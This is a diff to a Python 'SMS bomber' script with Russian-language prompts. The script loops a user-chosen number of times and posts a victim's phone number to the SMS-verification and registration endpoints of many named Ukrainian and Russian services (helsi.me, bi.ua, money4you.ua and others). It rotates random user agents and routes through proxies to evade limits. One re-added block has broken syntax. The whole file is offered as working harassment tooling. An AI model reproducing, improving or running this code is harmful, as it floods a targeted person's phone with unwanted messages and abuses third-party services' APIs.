@@ -48,63 +48,16 @@ run = int(console.input('[green]Введите количество повтор
 #------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 for _ in track(range(run)):
  headers = {"User-Agent": fake_useragent.UserAgent().random}
- try:
-     formatted_phone = format_phone(number, "+###+##+###+##+##")
-     requests.post("https://kumo.com.ua/registration/sms/", data={"phone": "+" + number, "_token": "bXjwBMo8eSTiyWpex3QEOqwblgWabMYTPK2uyZ7m", "g-recaptcha-response": "1"}, headers=headers, proxies=proxies)
-     print('kumo.com.ua')
- except:
-     print('Не отправлено (kumo.com.ua)')
- try:
-         requests.post("https://passport.aitu.io/api/v1/sms/request-code", json={"phone": "+" + number}, headers=headers, proxies=proxies)
-         print('aitu.io')
- except:
-         print('Не отправлено (aitu.io)')
- try:
-         requests.post("https://helsi.me/api/healthy/v2/accounts/login", json={"phone": number, "platform": "PISWeb"}, headers=headers, proxies=proxies)
-         print('helsi.me')
- except:
-         print('Не отправлено (helsi.me)')
- try:
-         requests.post("https://ukrzoloto.ua/mobile/v1/auth/phone", json={"data": {"telephoneNumber": number}}, headers=headers, proxies=proxies)
-         print('ukrzoloto.ua')
- except:
-         print('Не отправлено (ukrzoloto.ua)')
- try:
-         requests.post("https://prosto.tv/wp-admin/admin-ajax.php", data={"action": "check-phone", "phone": "+" + number, "username": "Руслан", "_nonce": "db4f28b9da"}, headers=headers, proxies=proxies)
-         print('prosto.tv')
- except:
-         print('Не отправлено (prosto.tv)')
- try:
-         requests.post("https://sportbank.com.ua/send-sms", data={"phone": "+" + number, "agree": "1"}, headers=headers, proxies=proxies)
-         print('sportbank.com.ua')
- except:
-         print('Не отправлено (sportbank.com.ua)')
- try:
-         formatted_phone = format_phone(number, "+## (###) ###-##-##")
-         requests.post("https://izibank.com.ua/api/send_link", json={"deviceIOS": "false", "phone": "+" + number}, headers=headers, proxies=proxies)
-         print('izibank.com.ua')
- except:
-         print('Не отправлено (izibank.com.ua)')
- try:#ok
-         requests.post("https://admin1.groshivsim.com/api/sms/phone-verification/create", json={"phone": number}, headers=headers, proxies=proxies)
-         print('groshivsim.com')
- except:
-         print('Не отправлено (groshivsim.com)')
- try:#ok
-         requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", json={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers, proxies=proxies)
-         print('money4you.ua')
- except:
-         print('Не отправлено (money4you.ua)')
+try:
+        requests.post("https://helsi.me/api/healthy/v2/accounts/login", json={"phone": number, "platform": "PISWeb"}, headers=headers, proxies=proxies)
+        print('helsi.me')
+except:
+        print('Не отправлено (helsi.me)'
  try:#ok
          requests.post("https://my.xtra.tv/api/signup?lang=uk", data={"phone": number}, headers=headers, proxies=proxies)
          print('my.xtra.tv')
  except:
          print('Не отправлено (my.xtra.tv)')
- try:#ok
-         requests.post("https://auth.multiplex.ua/login", json={"login": "+" + number}, headers=headers, proxies=proxies)
-         print('multiplex.ua')
- except:
-         print('Не отправлено (multiplex.ua)')
  try:#ok
          requests.post("https://bi.ua/api/v1/accounts", json={"grand_type": "sms_code", "login": "Сергей", "phone": number, "stage": "1"}, headers=headers, proxies=proxies)
          print('bi.ua')
@@ -150,4 +103,14 @@ for _ in track(range(run)):
          print('kazan-divan.eatery.club')
  except:
          print('Не доставлено (kazan-divan.eatery.club)')
+ try:#ok
+         requests.post("https://admin1.groshivsim.com/api/sms/phone-verification/create", json={"phone": number}, headers=headers, proxies=proxies)
+         print('groshivsim.com')
+ except:
+         print('Не отправлено (groshivsim.com)')
+ try:#ok
+         requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", json={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers, proxies=proxies)
+         print('money4you.ua')
+ except:
+         print('Не отправлено (money4you.ua)')
 #------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
